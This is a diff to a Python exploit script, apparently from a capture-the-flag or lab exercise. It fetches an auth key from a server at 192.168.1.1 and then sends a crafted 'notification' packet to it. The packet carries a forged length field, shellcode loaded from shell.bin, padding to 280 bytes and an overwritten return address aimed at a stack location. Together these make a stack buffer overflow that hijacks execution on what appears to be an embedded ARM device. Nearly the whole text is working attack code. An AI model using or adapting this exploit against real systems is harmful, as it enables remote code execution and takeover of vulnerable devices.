@@ -6,7 +6,7 @@ import requests
 import struct
 
 SERVER_ADDR = "192.168.1.1:8000"
-STACK_POINTER = 0x2000FFFF
+STACK_POINTER = 0x2000DE00
 
 url = 'http://%s/auth' % (SERVER_ADDR)
 r = requests.get(url)
@@ -18,20 +18,24 @@ url = 'http://%s/notification?auth=%x' % (SERVER_ADDR, authKey)
 
 username = "Evil"
 message = "Hi! "
+desiredLen = 280
+
 notification = struct.pack('I', len(username))
 notification += bytes(username, 'utf-8')
-notification += struct.pack('I', len(message))
+notification += struct.pack('I', desiredLen - 12)
 notification += bytes(message, 'utf-8')
 if len(notification) != 16:
     print("Wrong length")
     exit(1)
+
+# add terminal zero to message string
+notification += b'\x00' * 4
 
 shell_offset = len(notification)
 
 shell = open("shell.bin", 'rb').read()
 notification += shell
 
-desiredLen = 280
 notification += b'\x00' * (desiredLen - len(notification) - 4)
 notification += struct.pack('I', STACK_POINTER - (desiredLen - shell_offset) + 1)
 if len(notification) != desiredLen:
